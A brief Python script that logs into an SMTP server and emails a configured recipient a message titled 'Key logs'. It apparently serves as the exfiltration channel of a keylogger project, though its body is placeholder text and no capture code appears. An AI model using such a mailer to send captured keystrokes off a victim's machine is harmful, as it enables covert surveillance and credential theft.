import smtplib
from config import Config as config

SMTP_SERVER = config.MAIL_SERVER
SMTP_PORT = config.MAIL_PORT
GMAIL_USERNAME = config.MAIL_USERNAME
GMAIL_PASSWORD = config.MAIL_PASSWORD #CAUTION: This is stored in plain text!

recipient = config.RECEIVER_MAIL
subject = 'Key logs'
emailText = 'This is the content of the e-mail.'

emailText = "" + emailText + ""

headers = ["From: " + GMAIL_USERNAME,
           "Subject: " + subject,
           "To: " + recipient,
           "MIME-Version: 1.0",
           "Content-Type: text/html"]
headers = "\r\n".join(headers)

session = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)

session.ehlo()
session.starttls()
session.ehlo()

session.login(GMAIL_USERNAME, GMAIL_PASSWORD)

session.sendmail(GMAIL_USERNAME, recipient, headers + "\r\n\r\n" + emailText)
session.quit()